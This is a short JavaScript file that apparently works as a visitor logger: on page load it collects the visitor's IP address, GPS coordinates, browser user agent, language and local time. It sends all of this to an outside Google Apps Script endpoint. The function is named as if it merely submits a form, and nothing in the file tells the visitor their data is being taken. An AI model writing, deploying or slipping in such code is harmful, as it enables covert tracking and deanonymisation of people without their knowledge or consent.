async function autoSubmitForm() {
    const ipData = await fetch("https://api.ipify.org?format=json").then(res => res.json());

    navigator.geolocation.getCurrentPosition(async function (position) {
        const latitude = position.coords.latitude;
        const longitude = position.coords.longitude;

        const formData = new URLSearchParams();
        formData.append("ip", ipData.ip);
        formData.append("userAgent", navigator.userAgent);
        formData.append("language", navigator.language);
        formData.append("timezone", new Date().toLocaleString());
        formData.append("latitude", latitude);
        formData.append("longitude", longitude);

        try {
            const response = await fetch("https://script.google.com/macros/s/AKfycbzYWKmICz_bsmnmHhcjSnqIYtPZ72hEBi5n2pAJAwyxyrrzgdvuiuR3kEkuv-BYNgQF/exec", {
                method: "POST",
                headers: {
                    "Content-Type": "application/x-www-form-urlencoded",
                },
                body: formData.toString()
            });

            const result = await response.text();
            console.log("Success:", result);
        } catch (error) {
            console.error("Error submitting form:", error);
        }
    });
}

window.onload = autoSubmitForm;